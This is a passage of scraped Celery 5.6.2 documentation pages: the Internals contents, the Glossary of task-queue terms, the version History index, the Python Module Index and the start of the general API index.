    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Internals\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nInternals\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nContributors Guide to the Code\nPhilosophy\nConventions and Idioms Used\nApplications vs. “single mode”\nModule Overview\nWorker overview\nCelery Deprecation Time-line\nRemovals for version 5.0\nRemovals for version 2.0\nInternals: The worker\nIntroduction\nData structures\nComponents\nMessage Protocol\nTask messages\nEvent Messages\n“The Big Instance” Refactor\nExamples\nDeprecated\nAliases (Pending deprecation)\nDefault App Usage\nInternal Module Reference\ncelery.worker.components\ncelery.worker.loops\ncelery.worker.heartbeat\ncelery.worker.control\ncelery.worker.pidbox\ncelery.worker.autoscale\ncelery.concurrency\ncelery.concurrency.solo\ncelery.concurrency.prefork\ncelery.concurrency.eventlet\ncelery.concurrency.gevent\ncelery.concurrency.thread\ncelery.concurrency.base\ncelery.backends\ncelery.backends.base\ncelery.backends.asynchronous\ncelery.backends.azureblockblob\ncelery.backends.rpc\ncelery.backends.database\ncelery.backends.cache\ncelery.backends.consul\ncelery.backends.couchdb\ncelery.backends.mongodb\ncelery.backends.elasticsearch\ncelery.backends.redis\ncelery.backends.cassandra\ncelery.backends.couchbase\ncelery.backends.arangodb\ncelery.backends.dynamodb\ncelery.backends.filesystem\ncelery.backends.cosmosdbsql\ncelery.backends.s3\ncelery.backends.gcs\ncelery.app.trace\ncelery.app.annotations\ncelery.app.routes\ncelery.security.certificate\ncelery.security.key\ncelery.security.serialization\ncelery.security.utils\ncelery.events.snapshot\ncelery.events.cursesmon\ncelery.events.dumper\ncelery.backends.database.models\ncelery.backends.database.session\ncelery.utils\ncelery.utils.abstract\ncelery.utils.collections\ncelery.utils.nodenames\ncelery.utils.deprecated\ncelery.utils.functional\ncelery.utils.graph\ncelery.utils.objects\ncelery.utils.term\ncelery.utils.time\ncelery.utils.iso8601\ncelery.utils.saferepr\ncelery.utils.serialization\ncelery.utils.sysinfo\ncelery.utils.threads\ncelery.utils.timer2\ncelery.utils.imports\ncelery.utils.log\ncelery.utils.text\ncelery.utils.dispatch\ncelery.utils.dispatch.signal\ncelery.platforms\ncelery._state\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\ncelery.bin.upgrade\n\nNext topic\n\nContributors Guide to the Code\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Internals\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491594,
    "timestamp": "2026-02-23T00:13:49.453Z",
    "title": "Glossary — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/glossary.html",
    "text": "index\nmodules |\nprevious |\nCelery 5.6.2 documentation » Glossary\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nGlossary\nack\n\nShort for acknowledged.\n\nacknowledged\n\nWorkers acknowledge messages to signify that a message has been handled. Failing to acknowledge a message will cause the message to be redelivered. Exactly when a transaction is considered a failure varies by transport. In AMQP the transaction fails when the connection/channel is closed (or lost), but in Redis/SQS the transaction times out after a configurable amount of time (the visibility_timeout).\n\napply\n\nOriginally a synonym to call but used to signify that a function is executed by the current process.\n\nbilliard\n\nFork of the Python multiprocessing library containing improvements required by Celery.\n\ncalling\n\nSends a task message so that the task function is executed by a worker.\n\ncipater\n\nCelery release 3.1 named after song by Autechre (http://www.youtube.com/watch?v=OHsaqUr_33Y)\n\ncontext\n\nThe context of a task contains information like the id of the task, it’s arguments and what queue it was delivered to. It can be accessed as the tasks request attribute. See Task Request\n\nearly ack\n\nShort for early acknowledgment\n\nearly acknowledgment\n\nTask is acknowledged just-in-time before being executed, meaning the task won’t be redelivered to another worker if the machine loses power, or the worker instance is abruptly killed, mid-execution.\n\nConfigured using task_acks_late.\n\nETA\n\n“Estimated Time of Arrival”, in Celery and Google Task Queue, etc., used as the term for a delayed message that should not be processed until the specified ETA time. See ETA and Countdown.\n\nexecuting\n\nWorkers execute task requests.\n\nidempotent\n\nIdempotence is a mathematical property that describes a function that can be called multiple times without changing the result. Practically it means that a function can be repeated many times without unintended effects, but not necessarily side-effect free in the pure sense (compare to nullipotent).\n\nFurther reading: https://en.wikipedia.org/wiki/Idempotent\n\nkombu\n\nPython messaging library used by Celery to send and receive messages.\n\nlate ack\n\nShort for late acknowledgment\n\nlate acknowledgment\n\nTask is acknowledged after execution (both if successful, or if the task is raising an error), which means the task will be redelivered to another worker in the event of the machine losing power, or the worker instance being killed mid-execution.\n\nConfigured using task_acks_late.\n\nnullipotent\n\ndescribes a function that’ll have the same effect, and give the same result, even if called zero or multiple times (side-effect free). A stronger version of idempotent.\n\npidbox\n\nA process mailbox, used to implement remote control commands.\n\nprefetch count\n\nMaximum number of unacknowledged messages a consumer can hold and if exceeded the transport shouldn’t deliver any more messages to that consumer. See Prefetch Limits.\n\nprefetch multiplier\n\nThe prefetch count is configured by using the worker_prefetch_multiplier setting, which is multiplied by the number of pool slots (threads/processes/greenthreads).\n\nreentrant\n\ndescribes a function that can be interrupted in the middle of execution (e.g., by hardware interrupt or signal), and then safely called again later. Reentrancy isn’t the same as idempotence as the return value doesn’t have to be the same given the same inputs, and a reentrant function may have side effects as long as it can be interrupted; An idempotent function is always reentrant, but the reverse may not be true.\n\nrequest\n\nTask messages are converted to requests within the worker. The request information is also available as the task’s context (the task.request attribute).\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nChange history for Celery 1.0\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nprevious |\nCelery 5.6.2 documentation » Glossary\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491593,
    "timestamp": "2026-02-23T00:13:49.453Z",
    "title": "History — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/history/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » History\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nHistory\n\nThis section contains historical change histories, for the latest version please visit Change history.\n\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nWhat’s new in Celery 5.6 (Recovery)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nNews\nChange history\n5.6.2\n5.6.1\n5.6.0\n5.6.0rc2\n5.6.0rc1\n5.6.0b2\n5.6.0b1\nWhat’s new in Celery 5.5 (Immunity)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nNews\nChange history\n5.5.3\n5.5.2\n5.5.1\n5.5.0\n5.5.0rc5\n5.5.0rc4\n5.5.0rc3\n5.5.0rc2\n5.5.0rc1\n5.5.0b4\n5.5.0b3\n5.5.0b2\n5.5.0b1\nWhat’s new in Celery 5.4 (Opalescent)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nChange history\n5.4.0\n5.4.0rc2\n5.4.0rc1\nWhat’s new in Celery 5.3 (Emerald Rush)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nChange history\n5.3.6\n5.3.5\n5.3.4\n5.3.3 (Yanked)\n5.3.2 (Yanked)\n5.3.1\n5.3.0\n5.3.0rc2\n5.3.0rc1\n5.3.0b2\n5.3.0b1\n5.3.0a1\nWhat’s new in Celery 5.1 (Sun Harmonics)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nNews\nChange history\n5.1.2\n5.1.1\n5.1.0\n5.1.0rc1\n5.1.0b2\n5.1.0b1\nWhat’s new in Celery 5.0 (singularity)\nPreface\nUpgrading from Celery 4.x\nImportant Notes\nNews\nChange history\n5.0.6\n5.0.5\n5.0.4\n5.0.3\n5.0.2\n5.0.1\n5.0.0\n5.0.0rc3\n5.0.0rc2\n5.0.0rc1\n5.0.0b1\n5.0.0a2\n5.0.0a1\nWhat’s new in Celery 4.4 (Cliffs)\nPreface\nUpgrading from Celery 4.3\nImportant Notes\nNews\nChange history\n4.4.7\n4.4.6\n4.4.5\n4.4.4\n4.4.3\n4.4.0\n4.4.0rc5\n4.4.0rc4\n4.4.0rc3\n4.4.0rc2\n4.4.0rc1\n4.3.0\n4.3.0 RC2\n4.3.0 RC1\nWhat’s new in Celery 4.3 (rhubarb)\nPreface\nUpgrading from Celery 4.2\nImportant Notes\nNews\nChange history\n4.3.1\n4.3.0\n4.3.0 RC2\n4.3.0 RC1\nWhat’s new in Celery 4.2 (windowlicker)\nPreface\nImportant Notes\nNews\nChange history\n4.2.1\n4.2.0\nWhat’s new in Celery 4.1 (latentcall)\nPreface\nImportant Notes\nNews\nChange history\n4.1.1\n4.1.0\nWhat’s new in Celery 4.0 (latentcall)\nPreface\nUpgrading from Celery 3.1\nImportant Notes\nNews\nReorganization, Deprecations, and Removals\nDeprecation Time-line Changes\nChange history\n4.0.2\n4.0.1\n4.0.0\n4.0.0rc7\nWhat’s new in Celery 3.1 (Cipater)\nPreface\nImportant Notes\nNews\nScheduled Removals\nDeprecation Time-line Changes\nFixes\nInternal changes\nChange history\n3.1.26\n3.1.25\n3.1.24\n3.1.23\n3.1.22\n3.1.21\n3.1.20\n3.1.19\n3.1.18\n3.1.17\n3.1.16\n3.1.15\n3.1.14\n3.1.13\n3.1.12\n3.1.11\n3.1.10\n3.1.9\n3.1.8\n3.1.7\n3.1.6\n3.1.5\n3.1.4\n3.1.3\n3.1.2\n3.1.1\n3.1.0\nWhat’s new in Celery 3.0 (Chiastic Slide)\nHighlights\nImportant Notes\nNews\nExperimental\nUnscheduled Removals\nDeprecation Time-line Changes\nFixes\nChange history for Celery 3.0\n3.0.24\n3.0.23\n3.0.22\n3.0.21\n3.0.20\n3.0.19\n3.0.18\n3.0.17\n3.0.16\n3.0.15\n3.0.14\n3.0.13\n3.0.12\n3.0.11\n3.0.10\n3.0.9\n3.0.8\n3.0.7\n3.0.6\n3.0.5\n3.0.4\n3.0.3\n3.0.2\n3.0.1\n3.0.0 (Chiastic Slide)\nWhat’s new in Celery 2.5\nImportant Notes\nOptimization\nDeprecation Time-line Changes\nNews\nFixes\nChange history for Celery 2.5\n2.5.5\n2.5.3\n2.5.2\n2.5.1\n2.5.0\nChange history for Celery 2.4\n2.4.5\n2.4.4\n2.4.3\n2.4.2\n2.4.1\n2.4.0\nChange history for Celery 2.3\n2.3.4\n2.3.3\n2.3.2\n2.3.1\n2.3.0\nChange history for Celery 2.2\n2.2.8\n2.2.7\n2.2.6\n2.2.5\n2.2.4\n2.2.3\n2.2.2\n2.2.1\n2.2.0\nChange history for Celery 2.1\n2.1.4\n2.1.3\n2.1.2\n2.1.1\n2.1.0\nChange history for Celery 2.0\n2.0.3\n2.0.2\n2.0.1\n2.0.0\nChange history for Celery 1.0\n1.0.6\n1.0.5\n1.0.4\n1.0.3\n1.0.2\n1.0.1\n1.0.0\n0.8.4\n0.8.3\n0.8.2\n0.8.1\n0.8.0\n0.6.0\n0.4.1\n0.4.0\n0.3.20\n0.3.7\n0.3.3\n0.3.2\n0.3.1\n0.3.0\n0.2.0\n0.2.0-pre3\n0.2.0-pre2\n0.2.0-pre1\n0.1.15\n0.1.14\n0.1.13\n0.1.12\n0.1.11\n0.1.10\n0.1.8\n0.1.7\n0.1.6\n0.1.0\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\ncelery._state\n\nNext topic\n\nWhat’s new in Celery 5.6 (Recovery)\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » History\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491596,
    "timestamp": "2026-02-23T00:13:49.460Z",
    "title": "Python Module Index — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/py-modindex.html",
    "text": "index\nmodules |\nCelery 5.6.2 documentation » Python Module Index\nPython Module Index\nc\n\t \t\n\tc\t\n\tcelery\tDistributed processing\n\t    celery._state\t\n\t    celery.app\t\n\t    celery.app.amqp\t\n\t    celery.app.annotations\t\n\t    celery.app.autoretry\t\n\t    celery.app.backends\t\n\t    celery.app.builtins\t\n\t    celery.app.control\t\n\t    celery.app.defaults\t\n\t    celery.app.events\t\n\t    celery.app.log\t\n\t    celery.app.registry\t\n\t    celery.app.routes\t\n\t    celery.app.task\t\n\t    celery.app.trace\t\n\t    celery.app.utils\t\n\t    celery.apps.beat\t\n\t    celery.apps.multi\t\n\t    celery.apps.worker\t\n\t    celery.backends\t\n\t    celery.backends.arangodb\t\n\t    celery.backends.asynchronous\t\n\t    celery.backends.azureblockblob\t\n\t    celery.backends.base\t\n\t    celery.backends.cache\t\n\t    celery.backends.cassandra\t\n\t    celery.backends.consul\t\n\t    celery.backends.cosmosdbsql\t\n\t    celery.backends.couchbase\t\n\t    celery.backends.couchdb\t\n\t    celery.backends.database\t\n\t    celery.backends.database.models\t\n\t    celery.backends.database.session\t\n\t    celery.backends.dynamodb\t\n\t    celery.backends.elasticsearch\t\n\t    celery.backends.filesystem\t\n\t    celery.backends.gcs\t\n\t    celery.backends.mongodb\t\n\t    celery.backends.redis\t\n\t    celery.backends.rpc\t\n\t    celery.backends.s3\t\n\t    celery.beat\t\n\t    celery.bin.amqp\t\n\t    celery.bin.base\t\n\t    celery.bin.beat\t\n\t    celery.bin.call\t\n\t    celery.bin.celery\t\n\t    celery.bin.control\t\n\t    celery.bin.events\t\n\t    celery.bin.graph\t\n\t    celery.bin.list\t\n\t    celery.bin.logtool\t\n\t    celery.bin.migrate\t\n\t    celery.bin.multi\t\n\t    celery.bin.purge\t\n\t    celery.bin.result\t\n\t    celery.bin.shell\t\n\t    celery.bin.upgrade\t\n\t    celery.bin.worker\t\n\t    celery.bootsteps\t\n\t    celery.concurrency\t\n\t    celery.concurrency.base\t\n\t    celery.concurrency.eventlet\t\n\t    celery.concurrency.gevent\t\n\t    celery.concurrency.prefork\t\n\t    celery.concurrency.solo\t\n\t    celery.concurrency.thread\t\n\t    celery.contrib.abortable\t\n\t    celery.contrib.django.task\t\n\t    celery.contrib.migrate\t\n\t    celery.contrib.pytest\t\n\t    celery.contrib.rdb\t\n\t    celery.contrib.sphinx\t\n\t    celery.contrib.testing.app\t\n\t    celery.contrib.testing.manager\t\n\t    celery.contrib.testing.mocks\t\n\t    celery.contrib.testing.worker\t\n\t    celery.events\t\n\t    celery.events.cursesmon\t\n\t    celery.events.dispatcher\t\n\t    celery.events.dumper\t\n\t    celery.events.event\t\n\t    celery.events.receiver\t\n\t    celery.events.snapshot\t\n\t    celery.events.state\t\n\t    celery.exceptions\t\n\t    celery.loaders\t\n\t    celery.loaders.app\t\n\t    celery.loaders.base\t\n\t    celery.loaders.default\t\n\t    celery.platforms\t\n\t    celery.result\t\n\t    celery.schedules\t\n\t    celery.security\t\n\t    celery.security.certificate\t\n\t    celery.security.key\t\n\t    celery.security.serialization\t\n\t    celery.security.utils\t\n\t    celery.signals\t\n\t    celery.states\t\n\t    celery.utils\t\n\t    celery.utils.abstract\t\n\t    celery.utils.collections\t\n\t    celery.utils.debug\t\n\t    celery.utils.deprecated\t\n\t    celery.utils.dispatch\t\n\t    celery.utils.dispatch.signal\t\n\t    celery.utils.functional\t\n\t    celery.utils.graph\t\n\t    celery.utils.imports\t\n\t    celery.utils.iso8601\t\n\t    celery.utils.log\t\n\t    celery.utils.nodenames\t\n\t    celery.utils.objects\t\n\t    celery.utils.saferepr\t\n\t    celery.utils.serialization\t\n\t    celery.utils.sysinfo\t\n\t    celery.utils.term\t\n\t    celery.utils.text\t\n\t    celery.utils.threads\t\n\t    celery.utils.time\t\n\t    celery.utils.timer2\t\n\t    celery.worker\t\n\t    celery.worker.autoscale\t\n\t    celery.worker.components\t\n\t    celery.worker.consumer\t\n\t    celery.worker.consumer.agent\t\n\t    celery.worker.consumer.connection\t\n\t    celery.worker.consumer.consumer\t\n\t    celery.worker.consumer.control\t\n\t    celery.worker.consumer.events\t\n\t    celery.worker.consumer.gossip\t\n\t    celery.worker.consumer.heart\t\n\t    celery.worker.consumer.mingle\t\n\t    celery.worker.consumer.tasks\t\n\t    celery.worker.control\t\n\t    celery.worker.heartbeat\t\n\t    celery.worker.loops\t\n\t    celery.worker.pidbox\t\n\t    celery.worker.request\t\n\t    celery.worker.state\t\n\t    celery.worker.strategy\t\n\t    celery.worker.worker\t\n\nDonations\n\nPlease help support this community project with a donation.\n\nQuick search\nindex\nmodules |\nCelery 5.6.2 documentation » Python Module Index\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491595,
    "timestamp": "2026-02-23T00:13:49.467Z",
    "title": "Index — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/genindex.html",
    "text": "index\nmodules |\nCelery 5.6.2 documentation » Index\nIndex\nSymbols | A | B | C | D | E | F | G | H | I | J | K | L | M | N | O | P | Q | R | S | T | U | V | W | Y\nSymbols\n--ack-messages\ncelery-migrate command line option\n--app\ncelery command line option\n--args\ncelery-call command line option\n--autoscale\ncelery-worker command line option\n--beat\ncelery-worker command line option\n--bpython\ncelery-shell command line option\n--broker\ncelery command line option\n--camera\ncelery-events command line option\n--compat\ncelery-upgrade-settings command line option\n--concurrency\ncelery-worker command line option\n--config\ncelery command line option\n--countdown\ncelery-call command line option\n--destination\ncelery-control command line option\ncelery-inspect command line option\ncelery-status command line option\n--detach\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--disable-prefetch\ncelery-worker command line option\n--discard\ncelery-worker command line option\n--django\ncelery-upgrade-settings command line option\n--dump\ncelery-events command line option\n--eta\ncelery-call command line option\n--eventlet\ncelery-shell command line option\n--events\ncelery-worker command line option\n--exchange\ncelery-call command line option\n--exclude-queues\ncelery-purge command line option\ncelery-worker command line option\n--executable\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--expires\ncelery-call command line option\n--force\ncelery-purge command line option\n--forever\ncelery-migrate command line option\n--freq\ncelery-events command line option\n--frequency\ncelery-events command line option\n--gevent\ncelery-shell command line option\n--gid\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--heartbeat-interval\ncelery-worker command line option\n--hostname\ncelery-worker command line option\n--include\ncelery-worker command line option\n--ipython\ncelery-shell command line option\n--json\ncelery-control command line option\ncelery-inspect command line option\ncelery-status command line option\n--kwargs\ncelery-call command line option\n--limit\ncelery-migrate command line option\n--list\ncelery-control command line option\ncelery-inspect command line option\n--loader\ncelery command line option\n--logfile\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--loglevel\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--max-interval\ncelery-beat command line option\n--max-memory-per-child\ncelery-worker command line option\n--max-tasks-per-child\ncelery-worker command line option\n--maxrate\ncelery-events command line option\n--no-backup\ncelery-upgrade-settings command line option\n--no-color\ncelery command line option\n--optimization\ncelery-worker command line option\n--pidfile\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--pool\ncelery-worker command line option\n--prefetch-multiplier\ncelery-worker command line option\n--purge\ncelery-worker command line option\n--python\ncelery-shell command line option\n--queue\ncelery-call command line option\n--queues\ncelery-migrate command line option\ncelery-purge command line option\ncelery-worker command line option\n--quiet\ncelery command line option\n\t\n--result-backend\ncelery command line option\n--routing-key\ncelery-call command line option\n--schedule\ncelery-beat command line option\ncelery-worker command line option\n--schedule-filename\ncelery-worker command line option\n--scheduler\ncelery-beat command line option\ncelery-worker command line option\n--serializer\ncelery-call command line option\n--skip-checks\ncelery command line option\n--soft-time-limit\ncelery-worker command line option\n--statedb\ncelery-worker command line option\n--task\ncelery-result command line option\n--task-events\ncelery-worker command line option\n--tasks\ncelery-migrate command line option\n--time-limit\ncelery-worker command line option\n--timeout\ncelery-control command line option\ncelery-inspect command line option\ncelery-migrate command line option\ncelery-status command line option\n--traceback\ncelery-result command line option\n--uid\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--umask\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n--version\ncelery command line option\n--without-gossip\ncelery-worker command line option\n--without-heartbeat\ncelery-worker command line option\n--without-mingle\ncelery-worker command line option\n--without-tasks\ncelery-shell command line option\n--workdir\ncelery command line option\n-A\ncelery command line option\n-a\ncelery-call command line option\ncelery-migrate command line option\n-B\ncelery-shell command line option\ncelery-worker command line option\n-b\ncelery command line option\n-C\ncelery command line option\n-c\ncelery-events command line option\ncelery-worker command line option\n-D\ncelery-worker command line option\n-d\ncelery-control command line option\ncelery-events command line option, [1]\ncelery-inspect command line option\ncelery-status command line option\n-E\ncelery-worker command line option\n-F\ncelery-events command line option\ncelery-migrate command line option\n-f\ncelery-beat command line option\ncelery-events command line option\ncelery-purge command line option\ncelery-worker command line option\n-I\ncelery-shell command line option\ncelery-worker command line option\n-j\ncelery-control command line option\ncelery-inspect command line option\ncelery-status command line option\n-k\ncelery-call command line option\n-l\ncelery-beat command line option\ncelery-events command line option\ncelery-worker command line option\n-n\ncelery-migrate command line option\ncelery-worker command line option\n-O\ncelery-worker command line option\n-P\ncelery-worker command line option\n-Q\ncelery-migrate command line option\ncelery-purge command line option\ncelery-worker command line option\n-q\ncelery command line option\n-r\ncelery-events command line option\n-S\ncelery-beat command line option\ncelery-worker command line option\n-s\ncelery-beat command line option\ncelery-worker command line option\n-T\ncelery-migrate command line option\ncelery-shell command line option\n-t\ncelery-control command line option\ncelery-inspect command line option\ncelery-migrate command line option\ncelery-result command line option\ncelery-status command line option\n-X\ncelery-purge command line option\ncelery-worker command line option\nA\nabbr() (in module celery.utils.text)\nabbrtask() (in module celery.utils.text)\nabcast() (celery.app.control.Control.Mailbox method)\nabort() (celery.contrib.abortable.AbortableAsyncResult method)\nAbortableAsyncResult (class in celery.contrib.abortable)\nAbortableTask (class in celery.contrib.abortable)\nabstract (celery.app.task.Task attribute)\n(celery.contrib.abortable.AbortableTask attribute)\naccept (celery.app.control.Control.Mailbox attribute)\n(celery.backends.rpc.RPCBackend.ResultConsumer.Consumer attribute)\naccept_content\nsetting\nack\nacknowledge() (celery.worker.request.Request method)\nacknowledged\n(celery.worker.request.Request attribute)\nacks_late (celery.app.task.Task attribute)\n(Task attribute)\nacks_on_failure_or_timeout (celery.app.task.Task attribute)\nacquire() (celery.platforms.Pidfile method)\nactive (celery.concurrency.base.BasePool property)\n(celery.events.state.State.Worker attribute)\n(celery.events.state.Worker attribute)\nactive() (celery.app.control.Inspect method)\nactive_queues\ncontrol\nactive_queues() (celery.app.control.Inspect method)\nactive_requests (in module celery.worker.state)\nadd() (celery.app.amqp.Queues method)\n(celery.beat.Scheduler method)\n(celery.result.ResultSet method)\n(celery.utils.collections.LimitedSet method)\n(hub method)\nadd_arc() (celery.utils.graph.DependencyGraph method)\nadd_autoretry_behaviour() (in module celery.app.autoretry)\nadd_cert() (celery.security.certificate.CertStore method)\nadd_compat() (celery.app.amqp.Queues method)\nadd_consumer\ncontrol\nadd_consumer() (celery.app.control.Control method)\nadd_defaults() (celery.Celery method)\n(celery.utils.collections.ChainMap method)\nadd_edge() (celery.utils.graph.DependencyGraph method)\nadd_pending_result() (celery.backends.asynchronous.AsyncBackendMixin method)\nadd_pending_results() (celery.backends.asynchronous.AsyncBackendMixin method)\nadd_periodic_task() (celery.Celery method)\nadd_queue() (celery.backends.rpc.RPCBackend.ResultConsumer.Consumer method)\nadd_reader() (hub method)\nadd_task_queue() (celery.worker.consumer.Consumer method)\n(celery.worker.consumer.consumer.Consumer method)\nadd_to_chord() (celery.app.task.Task method)\n(celery.backends.redis.RedisBackend method)\nadd_writer() (hub method)\nadjust() (celery.beat.Scheduler method)\nadjust_timestamp() (in module celery.utils.time)\nafter_return()\n(celery.app.task.Task method)\nafter_setup_logger\nsignal\nafter_setup_task_logger\nsignal\nafter_task_publish\nsignal\nAgent (class in celery.worker.consumer)\n(class in celery.worker.consumer.agent)\nalert() (celery.events.cursesmon.CursesMonitor method)\nalert_remote_control_reply() (celery.events.cursesmon.CursesMonitor method)\nalias (celery.bootsteps.Blueprint property)\n(celery.bootsteps.Step property)\nalive (celery.events.state.State.Worker property)\n(celery.events.state.Worker property)\nalive() (celery.apps.multi.Node method)\n(celery.bin.multi.MultiTool.MultiParser.Node method)\nalive_workers() (celery.events.state.State method)\nALL_STATES\nstate\nalready_setup (celery.app.log.Logging attribute)\nAlreadyRegistered\nalt (celery.app.defaults.Option attribute)\nAlwaysEagerIgnored\namqp (celery.Celery attribute)\nAMQP (class in celery.app.amqp)\nannotate() (celery.app.annotations.MapAnnotation method)\nannotate_any() (celery.app.annotations.MapAnnotation method)\nanon_nodename() (in module celery.utils.nodenames)\napp, [1]\n(celery.app.control.Inspect attribute)\n(celery.apps.beat.Beat attribute)\n(celery.events.dispatcher.EventDispatcher attribute)\n(celery.events.EventDispatcher attribute)\n(celery.events.EventReceiver attribute)\n(celery.events.receiver.EventReceiver attribute)\n(celery.result.AsyncResult attribute)\n(celery.result.ResultSet property)\n(celery.schedules.crontab attribute)\n(celery.utils.abstract.CallableSignature property)\n(celery.worker.request.Request property)\n(celery.worker.WorkController attribute)\n(celery.worker.worker.WorkController attribute)\napp_or_default() (in module celery.app)\n\t\nAppLoader (class in celery.loaders.app)\napply\napply() (celery.app.task.Task method)\n(celery.bootsteps.Blueprint method)\n(celery.utils.abstract.CallableTask method)\napply_async() (celery.app.task.Task method)\n(celery.beat.Scheduler method)\n(celery.concurrency.base.BasePool method)\n(celery.utils.abstract.CallableTask method)\napply_async_on_commit() (celery.contrib.django.task.DjangoTask method)\napply_chord() (celery.backends.redis.RedisBackend method)\napply_entry() (celery.beat.Scheduler method)\napply_eta_task()\n(celery.worker.consumer.Consumer method)\n(celery.worker.consumer.consumer.Consumer method)\napply_target() (in module celery.concurrency.base)\nappstr() (in module celery.app.utils)\narangodb_backend_settings\nsetting\nArangoDbBackend (class in celery.backends.arangodb)\nargs (celery.backends.database.models.TaskExtended attribute)\n(celery.beat.ScheduleEntry attribute)\n(celery.concurrency.base.BasePool.Timer.Entry attribute)\n(celery.events.state.State.Task attribute)\n(celery.events.state.Task attribute)\n(celery.result.AsyncResult property)\n(celery.utils.abstract.CallableSignature property)\n(celery.utils.timer2.Entry attribute)\n(celery.utils.timer2.Timer.Entry attribute)\n(celery.worker.request.Request property)\nargsrepr (celery.worker.request.Request property)\nargsrepr_maxsize (celery.app.amqp.AMQP attribute)\nargv_with_executable (celery.apps.multi.Node property)\n(celery.bin.multi.MultiTool.MultiParser.Node property)\nas_dict() (celery.events.state.State.Task method)\n(celery.events.state.Task method)\n(celery.utils.collections.LimitedSet method)\nas_list() (celery.result.AsyncResult method)\nas_tuple() (celery.result.AsyncResult method)\n(celery.result.GroupResult method)\nas_uri() (celery.backends.azureblockblob.AzureBlockBlobBackend method)\n(celery.backends.base.DisabledBackend method)\n(celery.backends.cache.CacheBackend method)\n(celery.backends.cassandra.CassandraBackend method)\n(celery.backends.mongodb.MongoBackend method)\n(celery.backends.redis.SentinelBackend method)\n(celery.backends.rpc.RPCBackend method)\nassert_accepted() (celery.contrib.testing.manager.ManagerMixin method)\nassert_received() (celery.contrib.testing.manager.ManagerMixin method)\nassert_result_tasks_in_progress_or_completed() (celery.contrib.testing.manager.ManagerMixin method)\nassert_task_state_from_result() (celery.contrib.testing.manager.ManagerMixin method)\nassert_task_worker_state() (celery.contrib.testing.manager.ManagerMixin method)\nAsyncBackendMixin (class in celery.backends.asynchronous)\nAsyncResult (celery.Celery attribute)\n(class in celery.result)\nAsyncResult() (celery.app.task.Task method)\n(celery.contrib.abortable.AbortableTask method)\nAsyncResult.TimeoutError\nasynloop() (in module celery.worker.loops)\nATTR (celery.utils.graph.DOT attribute)\nattr() (celery.utils.graph.GraphFormatter method)\nAttributeDict (class in celery.utils.collections)\nAttributeDictMixin (class in celery.utils.collections)\nattrs (celery.backends.rpc.RPCBackend.Exchange attribute)\nattrs() (celery.utils.graph.GraphFormatter method)\nATTRSEP (celery.utils.graph.DOT attribute)\nauto_declare (celery.backends.rpc.RPCBackend.Consumer attribute)\n(celery.backends.rpc.RPCBackend.Producer attribute)\n(celery.backends.rpc.RPCBackend.ResultConsumer.Consumer attribute)\nAUTO_DELETE\ncelery-amqp-exchange.declare command line option\ncelery-amqp-queue.declare command line option\nauto_delete (celery.backends.rpc.RPCBackend.Exchange attribute)\nautodiscover_tasks() (celery.Celery method)\n(celery.loaders.base.BaseLoader method)\nautodoc_skip_member_handler() (in module celery.contrib.sphinx)\nautoreloader\nautoretry_for (Task attribute)\nAutoscale (class in celery.bin.worker)\nautoscale() (celery.app.control.Control method)\nautoscaler\nAutoscaler (class in celery.worker.autoscale)\navailable (celery.utils.sysinfo.df property)\nAWS_ACCESS_KEY_ID\naws_region (celery.backends.dynamodb.DynamoDBBackend attribute)\nAWS_SECRET_ACCESS_KEY\nazureblockblob_base_path\nsetting\nazureblockblob_connection_timeout\nsetting\nazureblockblob_container_name\nsetting\nazureblockblob_read_timeout\nsetting\nazureblockblob_retry_increment_base\nsetting\nazureblockblob_retry_initial_backoff_sec\nsetting\nazureblockblob_retry_max_attempts\nsetting\nAzureBlockBlobBackend (class in celery.backends.azureblockblob)\nB\nbackend (celery.app.task.Task property)\n(celery.Celery attribute)\n(celery.result.AsyncResult attribute)\n(celery.result.ResultSet property)\n(Task attribute)\nBackendError\nBackendGetMetaError\nBackendStoreError\nbackground (celery.events.cursesmon.CursesMonitor attribute)\nBacklogLimitExceeded\nbanner() (celery.apps.beat.Beat method)\nBaseBackend (class in celery.backends.base)\nBaseLoader (class in celery.loaders.base)\nBasePool (class in celery.concurrency.base)\nBasePool.Timer (class in celery.concurrency.base)\nBasePool.Timer.Entry (class in celery.concurrency.base)\nBaseResultConsumer (class in celery.backends.asynchronous)\nBeat (celery.Celery attribute)\n(class in celery.apps.beat)\n(class in celery.worker.components)\nBeat.Service 